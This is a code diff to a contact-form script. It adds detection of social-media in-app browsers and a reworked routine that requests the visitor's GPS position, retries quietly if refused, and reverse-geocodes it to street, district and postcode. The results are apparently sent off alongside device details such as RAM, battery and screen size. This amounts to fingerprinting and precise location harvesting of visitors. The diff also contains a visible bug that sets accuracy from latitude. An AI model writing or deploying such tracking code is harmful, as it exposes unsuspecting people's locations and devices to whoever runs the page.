@@ -1305,36 +1305,68 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     } catch { return 'Unknown'; }
   }
 
+  const _ua_raw = navigator.userAgent || '';
+  const isIAB = /Instagram|FBAN|FBAV|Twitter|TikTok|Snapchat|Line\/|WhatsApp|LinkedInApp/i.test(_ua_raw);
+  const iabName = /Instagram/i.test(_ua_raw) ? 'Instagram IAB'
+                : /FBAN|FBAV/i.test(_ua_raw) ? 'Facebook IAB'
+                : /Twitter/i.test(_ua_raw)   ? 'Twitter IAB'
+                : /TikTok/i.test(_ua_raw)    ? 'TikTok IAB'
+                : /Snapchat/i.test(_ua_raw)  ? 'Snapchat IAB'
+                : /WhatsApp/i.test(_ua_raw)  ? 'WhatsApp IAB'
+                : /LinkedInApp/i.test(_ua_raw)? 'LinkedIn IAB'
+                : isIAB ? 'In-App Browser' : null;
+
+  async function reverseGeocode(lat, lon){
+    const nomCtrl = new AbortController();
+    const nomTid  = setTimeout(()=> nomCtrl.abort(), 6000);
+    try {
+      const res  = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, { signal: nomCtrl.signal });
+      clearTimeout(nomTid);
+      const data = await res.json();
+      if(data && data.address){
+        const a = data.address;
+        return {
+          jalan:     a.road || a.pedestrian || a.footway || a.path || '',
+          kelurahan: a.suburb || a.neighbourhood || a.hamlet || '',
+          kecamatan: a.city_district || a.district || a.county || '',
+          kota:      a.city || a.town || a.village || a.municipality || '',
+          negara:    a.country || '',
+          postcode:  a.postcode || '',
+          placeId:  `osm:${data.place_id}`,
+          lat, lon, accuracy: Math.round(lat)
+        };
+      }
+    } catch { clearTimeout(nomTid); }
+    return null;
+  }
+
   async function getDetailedLocation(){
     return new Promise((resolve)=>{
       if(sessionStorage.getItem('loc_asked')){ resolve(null); return; }
       sessionStorage.setItem('loc_asked','1');
       if(!navigator.geolocation){ resolve(null); return; }
+
+      function onSuccess(pos){
+        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+        reverseGeocode(lat, lon).then(result => {
+          if(result){ result.accuracy = Math.round(accuracy); }
+          resolve(result);
+        });
+      }
+
+      function onErrorFallback(){ resolve(null); }
+
+      function onErrorRetry(){
+        navigator.geolocation.getCurrentPosition(
+          onSuccess,
+          onErrorFallback,
+          { timeout: 10000, enableHighAccuracy: false, maximumAge: 60000 }
+        );
+      }
+
       navigator.geolocation.getCurrentPosition(
-        async (pos)=>{
-          const { latitude: lat, longitude: lon, accuracy } = pos.coords;
-          try {
-            const nomCtrl = new AbortController();
-            const nomTid  = setTimeout(()=> nomCtrl.abort(), 6000);
-            const res  = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, { signal: nomCtrl.signal });
-            clearTimeout(nomTid);
-            const data = await res.json();
-            if(data && data.address){
-              const a = data.address;
-              resolve({
-                jalan:     a.road || a.pedestrian || a.footway || a.path || '',
-                kelurahan: a.suburb || a.neighbourhood || a.hamlet || '',
-                kecamatan: a.city_district || a.district || a.county || '',
-                kota:      a.city || a.town || a.village || a.municipality || '',
-                negara:    a.country || '',
-                postcode:  a.postcode || '',
-                placeId:  `osm:${data.place_id}`,
-                lat, lon, accuracy: Math.round(accuracy)
-              });
-            } else { resolve(null); }
-          } catch { resolve(null); }
-        },
-        ()=> resolve(null),
+        onSuccess,
+        onErrorRetry,
         { timeout: 15000, enableHighAccuracy: true, maximumAge: 30000 }
       );
     });
@@ -1423,6 +1455,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     { name:'🧠 RAM',           value: ramGB, inline: true },
   ];
   if(battery) fields1.push({ name:'🔋 Battery', value: battery, inline: true });
+  if(iabName) fields1.push({ name:'📲 In-App Browser', value: iabName, inline: true });
   fields1.push(
     { name:'📐 Resolution',    value: scr, inline: true },
     { name:'🪟 Viewport',      value: viewport, inline: true },
